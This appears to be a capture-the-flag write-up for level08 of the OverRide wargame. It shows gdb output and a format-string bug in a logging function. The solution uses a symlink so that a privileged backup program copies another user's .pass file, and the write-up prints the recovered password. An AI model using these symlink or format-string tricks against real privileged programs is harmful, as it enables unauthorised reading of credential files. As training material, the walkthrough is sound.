Level08
-------

1) After checking the program with gdb we found :


(gdb) info functions

0x00000000004008c4  log_wrapper
0x00000000004009f0  main

2) Runing the program 

level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)

The program requests an argument

3) Let's run it with a file

level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ touch test.txt
level08@OverRide:~$ ./level08 test.txt 
level08@OverRide:~$ ls
backups  level08  test.txt
level08@OverRide:~$ cd backups/
level08@OverRide:~/backups$ ls
test.txt


we can clearely see that the file is being copied into /backups


4) Inside backups 

We can see that it creates .log

level08@OverRide:~/backups$ ls -la
total 4
drwxrwx---+ 1 level09 users    80 Mar 30 16:24 .
drwxrwxrwx+ 1 level08 level08 120 Mar 30 16:24 ..
-rwxrwx---+ 1 level09 users    63 Mar 30 16:24 .log
-r--r-----+ 1 level09 users     0 Mar 30 16:24 test.txt


level08@OverRide:~$ cat backups/.log 
LOG: Starting back up: test.txt
LOG: Finished back up test.txt



This comes from log_wrapper()

From disassembly: call fprintf@plt

  0x00000000004009d5 <+273>:	callq  0x4007a0 <fprintf@plt>


It writes logs into a file (the .log file).

So .log is: A file where the program writes messages using our input

5) Important observations


  0x00000000004009d5 <+273>:	callq  0x4007a0 <fprintf@plt>
  0x0000000000400996 <+210>:	callq  0x400740 <snprintf@plt>
  0x00000000004009aa <+230>:	callq  0x400780 <strcspn@plt>

This means : 

strcpy(buffer, argv[1]);
snprintf(buffer + ..., ..., something_with_input);
fprintf(file, buffer);

Our inpot is used as format string so it's a format string Vulnerability

so if we input 
--------------

./level08 "%x %x %x"
It will print stack values into .log


level08@OverRide:~$ ./level08 "%p %p %p %p %p"

level08@OverRide:~$ cat backups/.log 
LOG: Starting back up: 0xffffffffffffffec 0xec 0x400d6c 0xffffffffffffffff 0x7fffffffe8e8

6) The solution 

level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

level08@OverRide:~$ cat backups/.log 
LOG: Starting back up: /home/users/level09/.pass


It failed to open it because the path doesn't exist 

We do symlink
-------------

ln -s /home/users/level09/.pass exploit

became 

./backups/exploit → /home/users/level09/.pass


sooooooooooooooooooooooooooooo:


level08@OverRide:~$ ln -s /home/users/level09/.pass password
level08@OverRide:~$ ./level08 password 
level08@OverRide:~$ cat backups/password 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level08@OverRide:~$ 

